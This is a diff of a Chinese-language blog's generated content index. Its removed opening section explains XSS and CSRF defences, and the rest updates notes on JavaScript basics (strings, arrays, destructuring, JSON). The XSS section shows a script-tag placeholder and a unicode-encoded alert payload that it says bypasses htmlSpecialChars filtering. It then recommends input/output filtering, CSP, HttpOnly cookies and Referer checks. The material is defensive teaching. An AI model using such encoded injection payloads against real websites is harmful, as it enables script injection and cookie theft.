-<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>还是以上面的对某论坛网站的XSS攻击为例，在外部服务器成功获得用户的cookie后，它可以利用cookie，伪造成用户对论坛网站发起一系列的请求，例如修改用户名称，修改用户密码等。此时，就可以称该攻击为CSRF。</p>
-<h3 id="防范XSS和CSRF⭐️"><a href="#防范XSS和CSRF⭐️" class="headerlink" title="防范XSS和CSRF⭐️"></a>防范XSS和CSRF⭐️</h3><p><em><strong>核心思想：不相信任何外部来源数据！！！</strong></em></p>
-<p>一般来说，大部分的CSRF都是基于XSS的，因此可以说防住了XSS，也就基本防住了CSRF。</p>
-<p>对于防范XSS，主要有以下两个方法：</p>
-<ol>
-<li><strong>输入过滤：对外部输入进行彻底的敏感字符过滤</strong>——前端+后端</li>
-<li><strong>输出过滤：在显示在页面上时，做一些处理让敏感的代码脚本无法顺利执行</strong>——前端</li>
-</ol>
-<p>理论上，只要有输入数据的的地方，就存在XSS的漏洞，JavaScript的脚本可以以各种形式（如明文、编码等）注入到数据库中。</p>
-<p>就像上面提到的 JS 会以各种非法形式注入，其主要非法形式有两类：</p>
-<ol>
-<li><p><strong>明文：</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js 恶意代码</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>​        要处理好明文注入的过滤。</p>
-</li>
-<li><p><strong>编码：</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
-<p>上面这个编码为unicode编码，它可以绕过<code>htmlSpecialChars</code>的过滤并入库，然后在展示该信息的时候，html 会自动将unicode编码转换成明文即真正的可执行脚本。</p>
-<p>由于不仅unicode编码可以注入，其它类型的编码也可以（道理类似），我们需要尽量将页面的字符编码统一设置为一种（如unicode: utf-8），这样便于我们专注于处理unicode编码的注入。</p>
-</li>
-</ol>
-<h4 id="其它一些通用的防范方法"><a href="#其它一些通用的防范方法" class="headerlink" title="其它一些通用的防范方法"></a>其它一些通用的防范方法</h4><ol>
-<li><p>在输出html时，加上<code>Content Security Policy</code>的<code>Http Header</code></p>
-<p>作用：防止页面被XSS攻击时，嵌入第三方的脚本文件</p>
-</li>
-<li><p>在设置Cookie时，加上<code>HttpOnly</code>参数</p>
-<p>作用：可以防止页面被XSS攻击时，Cookie信息被盗取</p>
-<p>缺点：网站本身的<code>JavaScript</code>代码也无法操作Cookie</p>
-</li>
-<li><p>在开发API时，检验请求的Referer参数</p>
-<p>作用：可以在一定程度上防止CSRF攻击</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Network</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaScript琐碎基础---学习手记</title>
     <url>/2021/09/24/JavaScriptBasics/</url>
     <content><![CDATA[<p><strong>JavaScript语语法基础部分一览，包括面试常见的“深浅拷贝”、数据结构操作（如数组插入等）需熟记于心。</strong></p>
@@ -1423,7 +1239,7 @@
 <li>Math.min(a, b, c, …) —- 返回一个最小数</li>
 <li>Math.pow(n, power) — 返回n<sup>power</sup></li>
 </ul>
-<h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>en(n为数字)表示1*10<sup>n</sup></p>
+<h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>en(n为数字)表示 $*10^{n}$</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> Twothousand = <span class="number">2e3</span>; <span class="comment">// 2000</span></span><br></pre></td></tr></table></figure>
 <h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> s3 = <span class="string">`s`</span>;</span><br></pre></td></tr></table></figure>
 <p>反引号允许</p>
@@ -1440,16 +1256,15 @@
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.toUpperCase(); <span class="comment">// HELLO WORLD</span></span><br><span class="line"><span class="string">&#x27;Hello World&#x27;</span>.toLowerCase(); <span class="comment">// hello world</span></span><br></pre></td></tr></table></figure>
 <h3 id="查询子字符串"><a href="#查询子字符串" class="headerlink" title="查询子字符串"></a>查询子字符串</h3><p><code>string.indexOf(substr, pos)</code>，substr为要查询的子字符串，pos为从指定位置开始查询</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&#x27;Hello Word!&#x27;</span>;</span><br><span class="line">word.indexOf(<span class="string">&#x27;World&#x27;</span>); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>
-<p>**Others: **</p>
+<p><strong>Others:</strong></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Hello&quot;</span>.includes(<span class="string">&quot;el&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.startWith(<span class="string">&#x27;He&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.endWith(<span class="string">&#x27;lo&#x27;</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
 <h3 id="获取子字符串☑️"><a href="#获取子字符串☑️" class="headerlink" title="获取子字符串☑️"></a>获取子字符串☑️</h3><h4 id="slice-start-end"><a href="#slice-start-end" class="headerlink" title="slice( start[, end) )"></a>slice( start[, end) )</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">word.slice(<span class="number">0</span>,<span class="number">3</span>); <span class="comment">// Hel</span></span><br></pre></td></tr></table></figure>
 <h4 id="substr-start-length"><a href="#substr-start-length" class="headerlink" title="substr( start[, length )"></a>substr( start[, length )</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">word.substr(<span class="number">1</span>,<span class="number">3</span>); <span class="comment">// ell</span></span><br></pre></td></tr></table></figure>
 <h3 id="比较字符串"><a href="#比较字符串" class="headerlink" title="比较字符串"></a>比较字符串</h3><h4 id="小写字母总是大于大写字母"><a href="#小写字母总是大于大写字母" class="headerlink" title="小写字母总是大于大写字母"></a>小写字母总是大于大写字母</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span> &gt; <span class="string">&#x27;Z&#x27;</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
 <p>在JS内部，所有字符串都使用UTF-16编码（即：每个字符都有相应的数字代码）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;zealand&quot;</span>.codePointAt(<span class="number">0</span>); <span class="comment">// 122</span></span><br><span class="line"><span class="string">&quot;Zealand&quot;</span>.codePointAt(<span class="number">0</span>); <span class="comment">// 90</span></span><br><span class="line"><span class="built_in">String</span>.fromCodePoint(<span class="number">90</span>); <span class="comment">// Z</span></span><br></pre></td></tr></table></figure>
-<h1 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h1><ol>
-<li><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> arr2 = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Orange&quot;</span>, <span class="string">&quot;Plum&quot;</span>];</span><br><span class="line"></span><br><span class="line">fruits[<span class="number">0</span>]; <span class="comment">// &quot;Apple&quot;</span></span><br><span class="line"></span><br><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;Pear&quot;</span>;</span><br><span class="line"></span><br><span class="line">fruits.length; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = [<span class="string">&#x27;Apple&#x27;</span>, &#123;<span class="attr">name</span>:<span class="string">&#x27;Will&#x27;</span>&#125;, <span class="literal">true</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">&#x27;Hello&#x27;</span>);&#125;]; <span class="comment">// 任意类型数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li><h2 id="队列Queue和栈Stack"><a href="#队列Queue和栈Stack" class="headerlink" title="队列Queue和栈Stack"></a>队列Queue和栈Stack</h2><ol>
+<h1 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h1><h2 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> arr2 = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Orange&quot;</span>, <span class="string">&quot;Plum&quot;</span>];</span><br><span class="line"></span><br><span class="line">fruits[<span class="number">0</span>]; <span class="comment">// &quot;Apple&quot;</span></span><br><span class="line"></span><br><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;Pear&quot;</span>;</span><br><span class="line"></span><br><span class="line">fruits.length; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = [<span class="string">&#x27;Apple&#x27;</span>, &#123;<span class="attr">name</span>:<span class="string">&#x27;Will&#x27;</span>&#125;, <span class="literal">true</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">&#x27;Hello&#x27;</span>);&#125;]; <span class="comment">// 任意类型数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="2-队列Queue和栈Stack"><a href="#2-队列Queue和栈Stack" class="headerlink" title="2. 队列Queue和栈Stack"></a>2. 队列Queue和栈Stack</h2><ol>
 <li><h3 id="队列Queue-—-First-In-First-Out"><a href="#队列Queue-—-First-In-First-Out" class="headerlink" title="队列Queue — First In First Out"></a>队列Queue — First In First Out</h3><blockquote>
 <p>push —— 在末端加一个元素</p>
 <p>shift —— 取出队首一个元素，并返回该值</p>
@@ -1461,19 +1276,14 @@
 </blockquote>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fruits.pop(); <span class="comment">// &quot;Pear&quot;</span></span><br><span class="line">fruits; <span class="comment">// &quot;Apple&quot;, &quot;Orange&quot;</span></span><br></pre></td></tr></table></figure></li>
 <li><h3 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h3><p>在数组首端添加元素</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fruits.unshift(<span class="string">&quot;Banana&quot;</span>);</span><br><span class="line">fruits; <span class="comment">// &quot;Banana&quot;, &quot;Apple&quot;, &quot;Orange&quot;</span></span><br></pre></td></tr></table></figure></li>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fruits.unshift(<span class="string">&quot;Banana&quot;</span>);</span><br><span class="line">fruits; <span class="comment">// &quot;Banana&quot;, &quot;Apple&quot;, &quot;Orange&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="3-内部"><a href="#3-内部" class="headerlink" title="3.内部"></a>3.内部</h2></li>
 </ol>
-</li>
-<li><h2 id="内部"><a href="#内部" class="headerlink" title="内部"></a>内部</h2><p>数组本质上也是一个对象，<code>arr[0]</code>本质上类似<code>obj[key]</code>，arr是对象，数字是键</p>
-</li>
-<li><h2 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h2><p><code>push/pop</code>运行较快，而<code>shift/unshift</code>运行较慢</p>
-</li>
-<li><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;Mango&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// for loop</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;arr.length; i++) &#123;</span><br><span class="line">  alert(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for...of loop</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> element <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  alert(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><h2 id="length-可修改"><a href="#length-可修改" class="headerlink" title="length 可修改"></a>length 可修改</h2></li>
-<li><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;Mango&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(arr); <span class="comment">// &#x27;Apple,orange,Mango&#x27;</span></span><br><span class="line">arr.toString(); <span class="comment">// &#x27;Apple,orange,Mango&#x27;</span></span><br></pre></td></tr></table></figure>
-<h1 id="数组的方法‼️"><a href="#数组的方法‼️" class="headerlink" title="数组的方法‼️"></a>数组的方法‼️</h1></li>
-</ol>
-<h2 id="splice-start-deleteCount-element1-element2-…-—-in-place"><a href="#splice-start-deleteCount-element1-element2-…-—-in-place" class="headerlink" title="splice( start[, deleteCount, element1, element2, … ) — in-place"></a>splice( start[, deleteCount, element1, element2, … ) — in-place</h2><p><strong>可以实现插入、删除</strong></p>
+<p>数组本质上也是一个对象，<code>arr[0]</code>本质上类似<code>obj[key]</code>，arr是对象，数字是键</p>
+<h2 id="4-性能"><a href="#4-性能" class="headerlink" title="4.性能"></a>4.性能</h2><p><code>push/pop</code>运行较快，而<code>shift/unshift</code>运行较慢</p>
+<h2 id="5-循环"><a href="#5-循环" class="headerlink" title="5.循环"></a>5.循环</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;Mango&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// for loop</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;arr.length; i++) &#123;</span><br><span class="line">  alert(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for...of loop</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> element <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  alert(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="6-length-可修改"><a href="#6-length-可修改" class="headerlink" title="6. length 可修改"></a>6. length 可修改</h2><h2 id="7-toString"><a href="#7-toString" class="headerlink" title="7. toString()"></a>7. toString()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;Mango&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(arr); <span class="comment">// &#x27;Apple,orange,Mango&#x27;</span></span><br><span class="line">arr.toString(); <span class="comment">// &#x27;Apple,orange,Mango&#x27;</span></span><br></pre></td></tr></table></figure>
+<h1 id="数组的方法‼️"><a href="#数组的方法‼️" class="headerlink" title="数组的方法‼️"></a>数组的方法‼️</h1><h2 id="splice-start-deleteCount-element1-element2-…-—-in-place"><a href="#splice-start-deleteCount-element1-element2-…-—-in-place" class="headerlink" title="splice( start[, deleteCount, element1, element2, … ) — in-place"></a>splice( start[, deleteCount, element1, element2, … ) — in-place</h2><p><strong>可以实现插入、删除</strong></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;I&quot;</span>, <span class="string">&quot;study&quot;</span>, <span class="string">&quot;JavaScript&quot;</span>, <span class="string">&quot;right&quot;</span>, <span class="string">&quot;now&quot;</span>];</span><br><span class="line">arr.splice(<span class="number">0</span>, <span class="number">3</span>, <span class="string">&quot;Let&#x27;s&quot;</span>, <span class="string">&quot;dance&quot;</span>); <span class="comment">// [&quot;I&quot;, &quot;study&quot;, &quot;JavaScript&quot;];</span></span><br><span class="line">arr; <span class="comment">// [&quot;Let&#x27;s&quot;, &quot;dance&quot;, &quot;right&quot;, &quot;now&quot;]</span></span><br></pre></td></tr></table></figure>
 <h2 id="slice-start-end-1"><a href="#slice-start-end-1" class="headerlink" title="slice( start[, end) )"></a>slice( start[, end) )</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> newArr = arr.slice(<span class="number">1</span>,<span class="number">3</span>) <span class="comment">// newArr = [&#x27;e&#x27;, &#x27;l&#x27;]</span></span><br></pre></td></tr></table></figure>
 <h2 id="concat-arg1-arg2-…"><a href="#concat-arg1-arg2-…" class="headerlink" title="concat(arg1, arg2, …)"></a>concat(arg1, arg2, …)</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.concat(<span class="number">5</span>, [<span class="number">7</span>,<span class="number">9</span>]); <span class="comment">// [1,2,3,5,7,9]</span></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;Will&quot;</span>&#125;;</span><br><span class="line">arr.concat(obj1); <span class="comment">// [1,2,3,&#123;id: 1, name: &quot;Will&quot;&#125;]</span></span><br></pre></td></tr></table></figure>
@@ -1502,10 +1312,9 @@
 <li><p><strong>分割字符串为数组</strong></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> names = <span class="string">&quot;Will, Dion, Akshay&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> arr = names.split(<span class="string">&#x27;, &#x27;</span>);</span><br><span class="line">arr; <span class="comment">// [&quot;Will&quot;, &quot;Dion&quot;, &quot;Akshay&quot;]</span></span><br></pre></td></tr></table></figure></li>
 <li><p><strong>合并数组元素为字符串</strong></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> strName = arr.join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">strName; <span class="comment">// &quot;Will Dion Akshay&quot;</span></span><br></pre></td></tr></table></figure>
-<h3 id="reduce-reduceRight"><a href="#reduce-reduceRight" class="headerlink" title="reduce, reduceRight"></a>reduce, reduceRight</h3></li>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> strName = arr.join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">strName; <span class="comment">// &quot;Will Dion Akshay&quot;</span></span><br></pre></td></tr></table></figure></li>
 </ol>
-<p>用于根据数组计算单个值</p>
+<h3 id="reduce-reduceRight"><a href="#reduce-reduceRight" class="headerlink" title="reduce, reduceRight"></a>reduce, reduceRight</h3><p>用于根据数组计算单个值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> value = arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">accumulator, item, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;, [initial]);</span><br></pre></td></tr></table></figure>
 <ul>
 <li><p>accumulator本质上是个累加器。</p>
@@ -1529,8 +1338,8 @@
 <p><strong>显示调用迭代器</strong></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> iterator = str[<span class="built_in">Symbol</span>.iterator]()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = iterator.next();</span><br><span class="line">  <span class="keyword">if</span> (res.done) <span class="keyword">break</span>;</span><br><span class="line">  res.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="Array-from-—-将可迭代或类数组转化为数组对象（可使用数组的方法）"><a href="#Array-from-—-将可迭代或类数组转化为数组对象（可使用数组的方法）" class="headerlink" title="Array.from — 将可迭代或类数组转化为数组对象（可使用数组的方法）"></a>Array.from — 将可迭代或类数组转化为数组对象（可使用数组的方法）</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
-<li>**Iterable(可迭代): **实现了Symbol.iterator方法的对象</li>
-<li>**Array-like(类数组): **有索引和length属性的对象</li>
+<li><strong>Iterable(可迭代):</strong> 实现了Symbol.iterator方法的对象</li>
+<li><strong>Array-like(类数组):</strong> 有索引和length属性的对象</li>
 </ul>
 <h3 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">  <span class="number">0</span>: <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">  <span class="number">1</span>: <span class="string">&quot;World&quot;</span>,</span><br><span class="line">  length: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = <span class="built_in">Array</span>.from(arrayLike);</span><br><span class="line">arr.pop(); <span class="comment">// &quot;World&quot;</span></span><br><span class="line">arr; <span class="comment">// [&quot;Hello&quot;]</span></span><br></pre></td></tr></table></figure>
 <h3 id="Array-from还提供了一个可选参数—映射-mapping-函数"><a href="#Array-from还提供了一个可选参数—映射-mapping-函数" class="headerlink" title="Array.from还提供了一个可选参数—映射(mapping)函数"></a>Array.from还提供了一个可选参数—映射(mapping)函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from(obj, mapFunction, thisArg); <span class="comment">// thisArg允许我们为设置该函数设置this</span></span><br></pre></td></tr></table></figure>
@@ -1594,10 +1403,9 @@
 <li><p><strong>剩余…</strong></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [name1, name2, ...rest] = [<span class="string">&quot;Will&quot;</span>, <span class="string">&quot;Dion&quot;</span>, <span class="string">&quot;Akshay&quot;</span>, <span class="string">&quot;Ricky&quot;</span>, <span class="string">&quot;Sam&quot;</span>];</span><br><span class="line"></span><br><span class="line">rest; <span class="comment">// [&quot;Akshay&quot;, &quot;Ricky&quot;, &quot;Sam&quot;]</span></span><br></pre></td></tr></table></figure></li>
 <li><p>默认值</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [name1=<span class="string">&quot;Anonymous&quot;</span>, name2=<span class="string">&quot;Will&quot;</span>] = [<span class="string">&quot;Dion&quot;</span>];</span><br><span class="line"></span><br><span class="line">name1; <span class="comment">// &quot;Dion&quot;</span></span><br><span class="line">name2; <span class="comment">// &quot;Will&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h2></li>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [name1=<span class="string">&quot;Anonymous&quot;</span>, name2=<span class="string">&quot;Will&quot;</span>] = [<span class="string">&quot;Dion&quot;</span>];</span><br><span class="line"></span><br><span class="line">name1; <span class="comment">// &quot;Dion&quot;</span></span><br><span class="line">name2; <span class="comment">// &quot;Will&quot;</span></span><br></pre></td></tr></table></figure></li>
 </ol>
-<p>基本语法：<code>let &#123;var1, var2, ...&#125; = &#123;var1:..., var2:..., ...&#125;</code>，其中等号左侧的变量名顺序不重要，但<strong>变量名必须与右侧对象中的属性名一致</strong>。</p>
+<h2 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h2><p>基本语法：<code>let &#123;var1, var2, ...&#125; = &#123;var1:..., var2:..., ...&#125;</code>，其中等号左侧的变量名顺序不重要，但<strong>变量名必须与右侧对象中的属性名一致</strong>。</p>
 <p>用例：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> personAdmin = &#123;</span><br><span class="line">  name: <span class="string">&quot;Will&quot;</span>,</span><br><span class="line">  age: <span class="number">24</span>,</span><br><span class="line">  major: <span class="string">&quot;CS&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;name, age, major&#125; = personAdmin;</span><br></pre></td></tr></table></figure>
 <ol>
@@ -1611,10 +1419,9 @@
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;name, ...others&#125; = personAdmin;</span><br><span class="line"></span><br><span class="line">name; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">others; <span class="comment">// &#123;age: 24, major: &quot;CS&quot;&#125;</span></span><br></pre></td></tr></table></figure></li>
 <li><p><strong>提前声明变量，之后调用</strong></p>
 <p>不使用<code>let</code>时进行解构赋值，需要在最外侧加一个圆括号。这是因为<strong>JS会将主代码流的<code>&#123;...&#125;</code>当作一个代码块</strong></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name, age, major;</span><br><span class="line"></span><br><span class="line">(&#123;name, age, major&#125; = personAdmin);</span><br></pre></td></tr></table></figure>
-<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1></li>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name, age, major;</span><br><span class="line"></span><br><span class="line">(&#123;name, age, major&#125; = personAdmin);</span><br></pre></td></tr></table></figure></li>
 </ol>
-<p><strong>定义：</strong>JSON（JavaScript Object Notation）是表示值和对象的通用格式</p>
+<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p><strong>定义：</strong>JSON（JavaScript Object Notation）是表示值和对象的通用格式</p>
 <h2 id="JSON-stringify-—-将对象转为JSON"><a href="#JSON-stringify-—-将对象转为JSON" class="headerlink" title="JSON.stringify — 将对象转为JSON"></a>JSON.stringify — 将对象转为JSON</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> student = &#123;</span><br><span class="line">  name: <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">  age: <span class="number">30</span>,</span><br><span class="line">  isAdmin: <span class="literal">false</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> json = <span class="built_in">JSON</span>.stringify(student);</span><br><span class="line"><span class="keyword">typeof</span> json; <span class="comment">// &#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li><p><strong>注：</strong>通过<code>JSON.stringify()</code>方法将对象转换为字符串的过程称为 <strong>JSON编码</strong> 或 <strong>序列化（serialized）</strong>或<strong>字符串化</strong> 或 <strong>编组化</strong> </p>
@@ -1633,10 +1440,9 @@
 </ol>
 </li>
 <li><p>不能有循环引用</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line">a.student = b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringfiy(b); <span class="comment">// Error</span></span><br></pre></td></tr></table></figure>
-<h3 id="JSON-stringify完整语法"><a href="#JSON-stringify完整语法" class="headerlink" title="JSON.stringify完整语法"></a>JSON.stringify完整语法</h3></li>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line">a.student = b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringfiy(b); <span class="comment">// Error</span></span><br></pre></td></tr></table></figure></li>
 </ul>
-<p>JSON的完整语法为： <code>JSON.stringify(value, replacer, space)</code>。</p>
